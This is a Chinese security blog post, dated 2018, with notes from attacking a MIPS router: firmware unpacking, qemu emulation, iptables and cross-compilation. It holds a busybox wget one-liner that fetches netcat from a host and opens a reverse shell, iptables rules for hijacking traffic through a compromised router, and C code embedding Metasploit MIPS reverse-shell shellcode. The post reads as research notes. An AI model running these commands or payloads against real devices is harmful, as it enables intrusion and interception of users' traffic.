@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>qemu、iptables和交叉编译 | 5alt&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="上周huiming和hyperchem大佬带我搞了一发mips的路由器，遇到了一些坑，在这儿做些记录方便以后查看。 固件解包用binwalk分离文件然后用对应的文件系统解包工具解开。 osx上可以使用 https://github.com/cinquemb/firmware-mod-kit-osx">
+<meta property="og:type" content="article">
+<meta property="og:title" content="qemu、iptables和交叉编译">
+<meta property="og:url" content="http://5alt.me/2018/01/qemu、iptables和交叉编译/index.html">
+<meta property="og:site_name" content="5alt&#39;s Blog">
+<meta property="og:description" content="上周huiming和hyperchem大佬带我搞了一发mips的路由器，遇到了一些坑，在这儿做些记录方便以后查看。 固件解包用binwalk分离文件然后用对应的文件系统解包工具解开。 osx上可以使用 https://github.com/cinquemb/firmware-mod-kit-osx">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-08-16T04:24:28.785Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="qemu、iptables和交叉编译">
+<meta name="twitter:description" content="上周huiming和hyperchem大佬带我搞了一发mips的路由器，遇到了一些坑，在这儿做些记录方便以后查看。 固件解包用binwalk分离文件然后用对应的文件系统解包工具解开。 osx上可以使用 https://github.com/cinquemb/firmware-mod-kit-osx">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="5alt&#39;s Blog" type="application/atom+xml">
+    
+
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/open-sans/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-61217444-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+    
+
+
+</head>
+</html>
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">5alt&#39;s Blog</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/.">主页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/about">关于我</a>
+                
+                    <a class="main-nav-link" href="/learn">Learn</a>
+                
+                    <a class="main-nav-link" href="/wiki">WIKI</a>
+                
+                    <a class="main-nav-link" href="/tools">小工具</a>
+                
+                    <a class="main-nav-link" href="/talks">Talks</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="/css/images/avatar.png" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/.">主页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于我</a></td>
+                
+                    <td><a class="main-nav-link" href="/learn">Learn</a></td>
+                
+                    <td><a class="main-nav-link" href="/wiki">WIKI</a></td>
+                
+                    <td><a class="main-nav-link" href="/tools">小工具</a></td>
+                
+                    <td><a class="main-nav-link" href="/talks">Talks</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+                
+
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="/css/images/avatar.png" />
+            <h2 id="name">md5_salt</h2>
+            <h3 id="title">Researcher</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>Beijing, China</span>
+            <a id="follow" target="_blank" href="https://github.com/5alt/">关注我</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                29
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                0
+                <span>标签</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    
+                    <td>
+                        <a href="https://github.com/5alt/" target="_blank" title="github" class=tooltip>
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="https://twitter.com/md5_salt" target="_blank" title="twitter" class=tooltip>
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="/atom.xml" target="_blank" title="rss" class=tooltip>
+                            <i class="fa fa-rss"></i>
+                        </a>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            <section id="main"><article id="post-qemu、iptables和交叉编译" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+            qemu、iptables和交叉编译
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2018/01/qemu、iptables和交叉编译/">
+            <time datetime="2018-01-07T16:00:00.000Z" itemprop="datePublished">2018-01-08</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/逆向/">逆向</a>
+    </div>
+
+                        
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <p>上周huiming和hyperchem大佬带我搞了一发mips的路由器，遇到了一些坑，在这儿做些记录方便以后查看。</p>
+<h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>用binwalk分离文件然后用对应的文件系统解包工具解开。</p>
+<p>osx上可以使用 <a href="https://github.com/cinquemb/firmware-mod-kit-osx" target="_blank" rel="noopener">https://github.com/cinquemb/firmware-mod-kit-osx</a><br><a id="more"></a></p>
+<h2 id="qemu-模拟执行"><a href="#qemu-模拟执行" class="headerlink" title="qemu 模拟执行"></a>qemu 模拟执行</h2><p>安装<code>qemu-user-static</code>即可在<code>x86</code>的机器上执行mips的二进制文件。<br>加载库的路径是绝对路径，要么需要chroot来执行，要么需要把库拷到对应路径。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">salt@salt:cp $(<span class="built_in">which</span> qemu-mipsel) .</span><br><span class="line">salt@salt:~/rootfs$ sudo chroot . ./qemu-mips-static ./bin/busybox wget</span><br><span class="line">BusyBox vv1.9.1 (2016-09-01 16:26:57 CST) multi-call binary</span><br><span class="line"></span><br><span class="line">Usage: wget [OPTION]... HOST</span><br><span class="line"></span><br><span class="line">wget download and upload a file via HTTP</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">	-g    Download</span><br><span class="line">	<span class="_">-s</span>    Upload</span><br><span class="line">	-v    Verbose</span><br><span class="line">	-u    Username to be used</span><br><span class="line">	-p    Password to be used</span><br><span class="line">	<span class="_">-l</span>    Local file path</span><br><span class="line">	-r    Remote file path</span><br><span class="line">	-P    Port to be used, optional</span><br><span class="line">	-B    Bind <span class="built_in">local</span> ip, optional</span><br><span class="line">	-A    Remote resolved ip, optional</span><br><span class="line">	-b    Transfer start position</span><br><span class="line">	<span class="_">-e</span>    Transfer length</span><br><span class="line">	-m    Max transfer size</span><br><span class="line">	-c    Compress downloaded file</span><br></pre></td></tr></table></figure>
+<p>可以看到，在这个busybox里的wget和在普通Linux下的wget是不同的。<br>反弹shell <code>/bin/busybox wget -g 192.168.2.2 -l /tmp/nc -r /netcat; chmod 777 /tmp/nc;/tmp/nc 192.168.2.2 9988 -e /bin/sh</code></p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
+<li><a href="https://wiki.debian.org/QemuUserEmulation" target="_blank" rel="noopener">https://wiki.debian.org/QemuUserEmulation</a></li>
+<li><a href="https://github.com/multiarch/qemu-user-static" target="_blank" rel="noopener">https://github.com/multiarch/qemu-user-static</a></li>
+<li><a href="https://github.com/darkerego/mips-binaries" target="_blank" rel="noopener">https://github.com/darkerego/mips-binaries</a></li>
+<li><a href="https://w00tsec.blogspot.jp/2013/09/analyzing-and-running-binaries-from.html" target="_blank" rel="noopener">https://w00tsec.blogspot.jp/2013/09/analyzing-and-running-binaries-from.html</a></li>
+</ul>
+<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>以下大部分内容引用自 <a href="https://www.zybuluo.com/yiltoncent/note/82203" target="_blank" rel="noopener">https://www.zybuluo.com/yiltoncent/note/82203</a></p>
+<p>在路由器命令执行的时候可以考虑用<code>iptables</code>命令劫持经过此路由器的流量。</p>
+<p>iptables的结构为<code>iptables-&gt;Tables-&gt;Chains-&gt;Rules</code>。<br>iptables具有Filter、NAT、Mangle、Raw四种内建表，每种表里有不同的链。如果不指定-t选项，默认就是filter表。</p>
+<h3 id="filter表"><a href="#filter表" class="headerlink" title="filter表"></a>filter表</h3><p>Filter表示iptables的默认表，它具有三种内建链：</p>
+<p>INPUT链 - 处理来自外部的数据。<br>OUTPUT链 - 处理向外发送的数据。<br>FORWARD链 - 将数据转发到本机的其他网卡设备上。</p>
+<p>filter表用来过滤数据包，我们可以在任何时候匹配包并过滤它们。我们就是在这里根据包的内容对包做DROP或者ACCEPT的。当然，我们也可以预先在其他地方做些过滤，但是这个表才是设计用来过滤的。几乎所有的target都可以在这儿使用。</p>
+<h3 id="nat表"><a href="#nat表" class="headerlink" title="nat表"></a>nat表</h3><p>nat表有三种内建链：</p>
+<ul>
+<li>PREROUTING链 - 处理刚到达本机并在路由转发前的数据包。它会转换数据包中的目标IP地址，通常用于DNAT。</li>
+<li>POSTROUTING链 - 处理即将离开本机的数据包。它会转换数据包中的源IP地址，通常用于SNAT。</li>
+<li>OUTPUT链 - 处理本机产生的数据包。</li>
+</ul>
+<p>nat表中的操作有</p>
+<ul>
+<li>DNAT操作主要用在这样一种情况，你有一个合法的IP地址，要把对防火墙的访问重定向到其他的机子上。也就是说，我们改变的是数据包的目标地址，以使包能重路由到某台主机。 </li>
+<li>SNAT改变包的源地址，这极大程度上可以隐藏你的本地网络。一个很好的例子是我们知道防火墙的外部地址，但必须用这个地址替换本地网络地址。如果使用类似192.168.0.0/24这样的地址，是不会从Internet得到任何回应的。 </li>
+<li>MASQUERADE的作用如其名字一样，只是计算机的符合稍微多一点。因为对每个匹配的包，MASQUERADE都要查找可用的IP地址，而不是像SNAT用的IP地址是配置好的。当然，这也有好好处，就是我们可以通过PPP、PPPOE\SLIP等拨号得到的地址，这些地址可能是由ISP的DHCO随机分配的。</li>
+</ul>
+<h3 id="mangle表"><a href="#mangle表" class="headerlink" title="mangle表"></a>mangle表</h3><p>mangle表用于指定如何处理数据包。它能改变TCP头中的QoS位。mangle表具有5个内建链。</p>
+<ul>
+<li>PREROUTING</li>
+<li>OUTPUT</li>
+<li>FORWARD</li>
+<li>INPUT</li>
+<li>POSTROUTING</li>
+</ul>
+<p>mangle表中的操作有</p>
+<ul>
+<li>TOS操作用来设置或改变数据包的服务类型域。这常用来设置网络上的数据包如何被路由等策略。它在Internet上还不能使用，而且很多路由器不会注意到这个域值。 </li>
+<li>TTL操作用来改变数据包的生存时间域，我们可以让所有数据吧只有一个特殊的TTL。可以欺骗一些ISP。 </li>
+<li>MARK用来给包设置特殊的标记。它并不改变包的内容，只是在内核中对相应的包加入标记。</li>
+</ul>
+<p>常用操作<br><code>iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 80</code> 把8080端口的流量重定向到路由器的80端口<br><code>iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 1.1.1.1</code> 把80端口的流量重定向到外网ip<code>1.1.1.1</code><br><code>iptables -t nat -F PREROUTING</code> 清除nat表PREROUTING链的内容</p>
+<h3 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
+<li><a href="https://wiki.openwrt.org/doc/howto/netfilter" target="_blank" rel="noopener">https://wiki.openwrt.org/doc/howto/netfilter</a></li>
+<li><a href="https://www.zybuluo.com/yiltoncent/note/82203" target="_blank" rel="noopener">https://www.zybuluo.com/yiltoncent/note/82203</a></li>
+</ul>
+<h2 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h2><p>在路由器能命令执行后，考虑下载并执行自己的payload。首先需要判断cpu的类型。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">salt@salt:~/rootfs/bin$ readelf -h busybox</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2<span class="string">'s complement, big endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              EXEC (Executable file)</span></span><br><span class="line"><span class="string">  Machine:                           MIPS R3000</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x403f80</span></span><br><span class="line"><span class="string">  Start of program headers:          52 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          0 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x70001007, noreorder, pic, cpic, o32, mips32r2</span></span><br><span class="line"><span class="string">  Size of this header:               52 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           32 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         8</span></span><br><span class="line"><span class="string">  Size of section headers:           0 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         0</span></span><br><span class="line"><span class="string">  Section header string table index: 0</span></span><br></pre></td></tr></table></figure>
+<p>通过readelf可以看出，这个elf对应运行的cpu是32位大端mips架构。因此需要编译的目标架构也如此。</p>
+<h3 id="uclibc"><a href="#uclibc" class="headerlink" title="uclibc"></a>uclibc</h3><p><a href="https://uclibc.org/" target="_blank" rel="noopener">https://uclibc.org/</a> 有现成的交叉编译工具以及启动qemu的脚本。</p>
+<p>可以下载已经编译好的交叉编译工具，也可以直接启动一个qemu虚拟机。</p>
+<h3 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h3><p>手动搭建一套交叉编译的环境。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential bc gettext texinfo patch libncurses5-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/buildroot/buildroot</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
+<p>选择对应的cpu架构和toolchain里的kernel headers的版本，make，在<code>buildroot/output/host/usr/bin</code>目录下找到生成的交叉编译工具。</p>
+<h4 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h4><ul>
+<li><a href="https://buildroot.org/download" target="_blank" rel="noopener">https://buildroot.org/download</a></li>
+<li><a href="http://blog.csdn.net/QQ1084283172/article/details/68950682" target="_blank" rel="noopener">http://blog.csdn.net/QQ1084283172/article/details/68950682</a></li>
+</ul>
+<h3 id="docker-交叉编译环境"><a href="#docker-交叉编译环境" class="headerlink" title="docker 交叉编译环境"></a>docker 交叉编译环境</h3><p><a href="https://github.com/dockcross/dockcross" target="_blank" rel="noopener">https://github.com/dockcross/dockcross</a></p>
+<h2 id="编译shellcode"><a href="#编译shellcode" class="headerlink" title="编译shellcode"></a>编译shellcode</h2><p>用metasploit生成反弹shell的shellcode，放在c里编译。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">"\x24\x0f\xff\xfa\x01\xe0\x78\x27\x21\xe4\xff\xfd\x21\xe5\xff\xfd\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff\x34\x0f\xff\xfd\x01\xe0\x78\x27\xaf\xaf\xff\xe0\x3c\x0e\x11\x5c\x35\xce\x11\x5c\xaf\xae\xff\xe4\x3c\x0e\xc0\xa8\x35\xce\x02\x02\xaf\xae\xff\xe6\x27\xa5\xff\xe2\x24\x0c\xff\xef\x01\x80\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x24\x11\xff\xfd\x02\x20\x88\x27\x8f\xa4\xff\xff\x02\x20\x28\x21\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x10\xff\xff\x22\x31\xff\xff\x16\x30\xff\xfa\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ( (<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode )();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>之前编译的时候把shellcode放在了栈上，由于栈的保护机制默认是不能执行的。应该把shellcode放在data段。qemu模拟执行的时候没检查栈不可执行问题，导致模拟执行成功，实际执行失败。</p>
+<p>或者直接用别人编译好的mips二进制文件</p>
+<p><a href="https://github.com/darkerego/mips-binaries/" target="_blank" rel="noopener">https://github.com/darkerego/mips-binaries/</a></p>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://5alt.me/2018/01/qemu、iptables和交叉编译/" data-id="cjzj8jt0a002xgnpjhy0l48gq" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://5alt.me/2018/01/qemu、iptables和交叉编译/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://5alt.me/2018/01/qemu、iptables和交叉编译/">评论</a>
+    
+
+        </footer>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2018/01/MySQL注入检测/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">上一篇</strong>
+            <div class="article-nav-title">
+                
+                    MySQL注入检测
+                
+            </div>
+        </a>
+    
+    
+        <a href="/2017/11/我是如何用hrida自动生成签名的/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">下一篇</strong>
+            <div class="article-nav-title">我是如何用Hrida自动生成签名的</div>
+        </a>
+    
+</nav>
+
+
+    
+</article>
+
+
+    
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+
+    
+    </section>
+
+</section>
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2019/02/xss-in-azure-devops/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2019/02/xss-in-azure-devops/" class="title">How I alert(1) in Azure DevOps</a></p>
+                            <p class="item-date"><time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished">2019-02-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/08/某开发工具沙箱绕过导致RCE/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/奇技淫巧/">奇技淫巧</a></p>
+                            <p class="item-title"><a href="/2018/08/某开发工具沙箱绕过导致RCE/" class="title">某开发工具沙箱绕过导致RCE</a></p>
+                            <p class="item-date"><time datetime="2018-07-31T16:00:00.000Z" itemprop="datePublished">2018-08-01</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/批量扫描智能合约中的整数溢出问题/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/以太坊/">以太坊</a></p>
+                            <p class="item-title"><a href="/2018/04/批量扫描智能合约中的整数溢出问题/" class="title">批量扫描智能合约中的整数溢出问题</a></p>
+                            <p class="item-date"><time datetime="2018-04-25T16:00:00.000Z" itemprop="datePublished">2018-04-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/weblogic反序列化漏洞分析与调试/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2018/04/weblogic反序列化漏洞分析与调试/" class="title">weblogic反序列化漏洞分析与调试</a></p>
+                            <p class="item-date"><time datetime="2018-04-19T16:00:00.000Z" itemprop="datePublished">2018-04-20</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/业务逻辑中的session问题/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2018/04/业务逻辑中的session问题/" class="title">业务逻辑中的session问题</a></p>
+                            <p class="item-date"><time datetime="2018-04-16T16:00:00.000Z" itemprop="datePublished">2018-04-17</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">分类</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/fun/">fun</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/radio/">radio</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/云安全/">云安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/以太坊/">以太坊</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/奇技淫巧/">奇技淫巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂/">杂</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/逆向/">逆向</a><span class="category-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">归档</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">一月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a 